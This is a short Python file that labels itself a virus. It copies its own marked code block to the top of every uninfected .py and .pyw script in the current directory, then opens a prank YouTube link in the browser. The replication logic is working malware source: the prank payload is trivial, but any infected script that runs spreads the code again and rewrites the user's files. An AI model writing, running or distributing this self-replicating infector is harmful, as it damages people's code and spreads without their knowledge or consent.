## START VIRUS

import  sys, glob
import webbrowser
import time
import random


code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

virus_area = False
for line in lines:
    if line == '## START VIRUS\n':
        virus_area = True
    if virus_area:
        code.append(line)
    if line == '## END OF VIRUS\n':
        break

python_scripst = glob.glob('*.py') + glob.glob('*.pyw')

for script in python_scripst:
    with open(script, 'r') as f:
        script_code = f.readlines()

    infected = False
    for line in script_code:
        if line == '## START VIRUS\n':
            infected = True
            break
    if not infected:
        full_code = []
        full_code.extend(code)
        full_code.extend('\n')
        full_code.extend(script_code)

        with open(script, 'w') as f:
            f.writelines(full_code)

#Malicious

while True:
    sites = random.choice(['youtube.com/watch?v=dQw4w9WgXcQ'])
    visit = "http://{}".format(sites)
    webbrowser.open(visit)
    seconds = random.randrange(1)
    time.sleep(seconds)
    break


## END OF VIRUS
print("Done")
input()
